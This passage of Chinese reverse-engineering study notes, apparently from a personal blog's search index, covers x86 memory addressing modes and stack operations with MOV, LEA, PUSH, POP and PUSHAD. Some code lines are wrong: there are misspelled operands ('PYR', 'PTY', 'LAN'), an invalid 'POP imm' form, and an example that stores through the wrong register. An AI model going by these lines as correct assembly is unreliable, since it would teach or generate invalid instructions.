plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOV ECX,10<br>REP MOVSD<br>REP STOSD<br></code></pre></td></tr></table></figure><hr /><h2 id="内存寻址公式"><a class="markdownIt-Anchor" href="#内存寻址公式"></a> 内存寻址公式</h2><h3 id="立即数"><a class="markdownIt-Anchor" href="#立即数"></a> [立即数]</h3><ul><li>读取内存中的值：<ul><li><code>MOV EAX, DWORD PTR DS:[0x13FFC4]</code><ul><li>读取了C4,C5,C6,C7四个字节(因为是dword，从C4开始读取存进eax中)</li></ul></li><li><code>MOV EAX, DWORD PTR DS:[0x13FFC8]</code></li></ul></li><li>向内存中写入数据<ul><li><code>MOV DWORD PTR DS:[0x13FFC4], EAX</code></li><li><code>MOV DWORD PTR DS:[0x13FFC4], EBX</code></li></ul></li><li>获取内存编号<ul><li><code>LEA EAX, DWORD PTR DS:[0x13FFC4]</code></li><li><code>LEA EAX, DWORD PTR DS:[ESP+8]</code><ul><li>lea可以获取此时[ESP+8]位置上存储的内存地址编号，并赋值给eax</li></ul></li></ul></li></ul><h3 id="reg"><a class="markdownIt-Anchor" href="#reg"></a> [reg]</h3><ul><li>reg表示寄存器，可以是8个通用寄存器中的任意一个</li><li>读取内存的值<ul><li><code>MOV ECX, 0x13FFD0</code></li><li><code>MOV EAX, DWORD PTR DS:[ECX]</code><ul><li>此时<code>[ECX]</code>指将ecx的内容当作指针，指向对应的内存编号，取此内存的值赋值给eax,相当于<code>[ECX]</code>存取的是指针，取指针指向地址的值</li></ul></li></ul></li><li>向内存中写入数据<ul><li><code>MOV EDX, 0x13FFD8</code></li><li><code>MOV DWORD PTR DS:[ECX], 0X87654321</code></li></ul></li><li>获取内存编号<ul><li><code>LEA EAX, DWORD PTR DS:[EDX]</code><ul><li>获取的是内存的编号，即<code>[EDX]</code>存储的值</li></ul></li><li><code>MOV EAX, DWORD PTR DS:[EDX]</code><ul><li>获取的是存储的数据，即<code>[EDX]</code>存储的值(地址)指向的数据</li></ul></li></ul></li></ul><h3 id="reg-立即数"><a class="markdownIt-Anchor" href="#reg-立即数"></a> [reg + 立即数]</h3><ul><li>读取内存的值<ul><li><code>MOV ECX, 0x13FFD0</code></li><li><code>MOV EAX, DWORD PTR DS:[ECX+4]</code></li></ul></li><li>向内存中写入数据<ul><li><code>MOV EDX, 0x13FFD8</code></li><li><code>MOV DWORD PTR DS:[ECX+0xC], 0x87654321</code></li></ul></li><li>获取内存编号<ul><li><code>LEA EAX, DWORD PYR DS:[EDX+4]</code></li><li><code>MOV EAX, DWORD PTY DS:[EDX+4]</code></li></ul></li></ul><h3 id="regreg1248"><a class="markdownIt-Anchor" href="#regreg1248"></a> [reg+reg*{1,2,4,8}]</h3><ul><li>读取内存的值<ul><li><code>MOV EAX, 13FFC4</code></li><li><code>MOV ECX,2</code></li><li><code>MOV EDX, DWORD PTR DS:[EAX+ECX*4]</code><ul><li>最大的上限就是<code>FFFFFFFF</code></li></ul></li></ul></li><li>向内存中写入数据<ul><li><code>MOV EAX, 13FFC4</code></li><li><code>MOV ECX,2</code></li><li><code>MOV DWORD PTR DS:[EAX+ECX*4], 87654321</code></li></ul></li><li>获取内存编号<ul><li><code>LEA EAX, DWORD PTR DS:[EAX+ECX*4]</code></li></ul></li></ul><h3 id="regreg1248立即数"><a class="markdownIt-Anchor" href="#regreg1248立即数"></a> [reg+reg*{1,2,4,8}+立即数]</h3><ul><li>读取内存的值<ul><li><code>MOV EAX, 13FFC4</code></li><li><code>MOV ECX,2</code></li><li><code>MOV EDX, DWORD PTR DS:[EAX+ECX*4+4]</code><ul><li>最大的上限就是<code>FFFFFFFF</code></li></ul></li></ul></li><li>向内存中写入数据<ul><li><code>MOV EAX, 13FFC4</code></li><li><code>MOV ECX,2</code></li><li><code>MOV DWORD PTR DS:[EAX+ECX*4+4], 87654321</code></li></ul></li><li>获取内存编号<ul><li><code>LEA EAX, DWORD PTR DS:[EAX+ECX*4+4]</code></li></ul></li></ul><hr /><h1 id="堆栈"><a class="markdownIt-Anchor" href="#堆栈"></a> 堆栈</h1><h2 id="堆栈引入"><a class="markdownIt-Anchor" href="#堆栈引入"></a> 堆栈引入</h2><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291122016.png" alt="202210032020851" /></p><ul><li>1、BASE(栈底)，TOP(栈顶)是2个32位的通用寄存器，里面存储的是内存单元编号(内存地址)</li><li>2、BASE里面存储了一个地址，记录起始地址</li><li>3、TOP里面存储了一个地址，记录结束地址</li><li>4、存入数据的时候，TOP的值减4(这里每次存取的是4个字节)；释放数据的时候，TOP的值加4(这里每次存取的是4个字节)</li><li>5、因为WIndows分配是高地址向低地址分配，所以TOP加4才能进行释放数据</li><li>6、如果要读取中间的某个数据，可以通过TOP与BASE加上偏移的方式去读取</li><li>7、此方法为堆栈，优点就是临时存储大量的数据，便于查找</li></ul><h2 id="堆栈操作"><a class="markdownIt-Anchor" href="#堆栈操作"></a> 堆栈操作</h2><ul><li><code>MOV EBX, 13FFDC</code>——BASE</li><li><code>MOV EDX, 13FFDC</code>——TOP</li></ul><h3 id="压入数据"><a class="markdownIt-Anchor" href="#压入数据"></a> 压入数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;方法一<br>MOV DWORD PTR DS:[EDX-4], 0xBBBBBBBB<br>SUB EDX, 4<br>;方法二<br>LEA EDX, DWORD PTR DS:[EDX-4]<br>MOV DWORD PTR DS:[EDX], 0xDDDDDDDD<br></code></pre></td></tr></table></figure><blockquote><p><code>sub</code>与<code>lea</code>的两条语句等价，可以互换</p></blockquote><h3 id="读取第n个数"><a class="markdownIt-Anchor" href="#读取第n个数"></a> 读取第N个数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;读第四个压入的数据<br>MOV ESI, DWORD PTR DS:[EBX-0X10] ;0x10指4*4<br><br>MOV ESI, DWORD PTR DS:[EDX+0X10] ;0x10指4*4<br></code></pre></td></tr></table></figure><h3 id="弹出数据"><a class="markdownIt-Anchor" href="#弹出数据"></a> 弹出数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOV ECX, DWORD PTR DS:[EDX]<br>LAN EDX, DWORD PTR DS:[EDX+4] / ADD EDX, 4<br><br>LEA EDX, DWORD PTR DS:[EDX+4]<br>MOV EDI, DWORD PTR DS:[EDX-4]<br></code></pre></td></tr></table></figure><h2 id="默认堆栈"><a class="markdownIt-Anchor" href="#默认堆栈"></a> 默认堆栈</h2><ul><li><code>ESP</code>用于存储栈顶的值，<code>EBP</code>用于存储栈底的值</li><li><code>push 0x12345678/reg</code>将数据压入栈，同时偏移<code>ESP</code></li><li><code>pop reg</code>将数据弹出栈，赋值给寄存器<code>reg</code>，同时偏移<code>ESP</code></li><li><a href="https://blog.csdn.net/qq_44288506/article/details/104767511?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=push%E4%B8%8Epop%E6%8C%87%E4%BB%A4&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-104767511.142%5Ev47%5Epc_rank_34_1,201%5Ev3%5Econtrol_2&amp;spm=1018.2226.3001.4187">push与pop指令讲解</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">PUSH r32/m32<br>PUSH r16/m16<br>PUSH imm8/imm16/imm32<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">POP r32/m32<br>POP r16/m16<br>POP imm8/imm16/imm32<br>POP EBP #指EBP出栈，即将此时的内存编号赋值给EBP，同时ESP+4<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pushad ;保存当前通用寄存器到堆栈中<br>popad  ;将堆栈中的数据还原到通用寄存器中<br>;在此过程中堆栈的值不能发生变化，否则不能还原<br></code></pre></td></tr></table></figure><hr />]]></content>
    
    
    <categories>
      
      <category>逆向笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
